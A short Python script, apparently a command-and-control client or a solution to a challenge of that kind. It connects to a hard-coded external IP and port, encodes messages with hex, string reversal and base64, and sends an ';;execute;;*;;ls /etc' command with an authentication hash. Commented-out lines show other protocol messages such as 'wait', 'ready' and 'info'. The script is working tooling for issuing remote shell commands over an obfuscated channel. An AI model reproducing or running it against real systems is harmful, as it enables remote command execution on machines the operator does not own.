#! /usr/bin/python

import binascii
import base64
import struct
import socket
import hashlib

def encode(prefix, msg):
    print(hashlib.sha384(msg.encode('ascii')).hexdigest())
    out = prefix + msg
    print(hashlib.sha384(out.encode('ascii')).hexdigest())
    rev = prefix + binascii.hexlify(bytes(out, 'ascii')).decode('ascii')
    print(hashlib.sha384(rev.encode('ascii')).hexdigest())
    b64 = base64.b64encode(bytes(rev[::-1], 'ascii'))
    print(hashlib.sha384(b64).hexdigest())
    return struct.pack('>Q', len(b64)) + b64

def decode(msg):
    l = struct.unpack('>Q', msg[:8])[0]
    rev = base64.b64decode(msg[8:8 + l])[::-1]
    prefix, out = rev[:16].decode('ascii'), rev[16:]
    out = binascii.unhexlify(out).decode('ascii')
    return (prefix, out)

TCP_IP = '78.128.216.92'
TCP_PORT = 20220
BUFFER_SIZE = 1024 * 1024

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

cmds = [
    ('kl5puyj43brf7iso', ';;execute;;*;;ls /etc;;b8d4cd29e64dbf3cec215e6444ef8d5eff5df0f75389fb564ecb13008a6738a681a1f3cfe1ef3699cd9a5809eb7fa9f6'),
#    ('kl5puyj43brf7iso', ';;execute;;*;;ls /etc;;b8d4cd29e64dbf3cec215e6444ef8d5eff5df0f75389fb564ecb13008a6738a681a1f3cfe1ef3699cd9a5809eb7fa9f6'),
#    ('kl5puyj43brf7iso', ';;wait;;*;;5;;944f8b5a851f3ee8c4c8d0a30ca2f2b94cc6a3371b9ca09c4634d2da4884c44e5afb7ea7329ce724e38d07d7a4ebcfeb'),
#    ('1234000000000000', ';;ready;;Linux'),
#    ('kl5puyj43brf7iso', ';;info;;203.0.113.16.20202;;active;;3799114f203fbb343e8003ab2bc7dc1890d2e748ed4d6f17d630cb0f70db1a89e5ed98609e41136b3d44836a52a12122'),
]

#print('944f8b5a851f3ee8c4c8d0a30ca2f2b94cc6a3371b9ca09c4634d2da4884c44e5afb7ea7329ce724e38d07d7a4ebcfeb')
#print(hashlib.sha384('kl5puyj43brf7iso wait * 5'.encode('ascii')).hexdigest())
#print('---')
#encode(cmds[1][0], cmds[1][1])

for cmd in cmds:
    print(cmd)
    s.send(encode(cmd[0], cmd[1]))
    data = s.recv(BUFFER_SIZE)
    print(decode(data))

s.close()

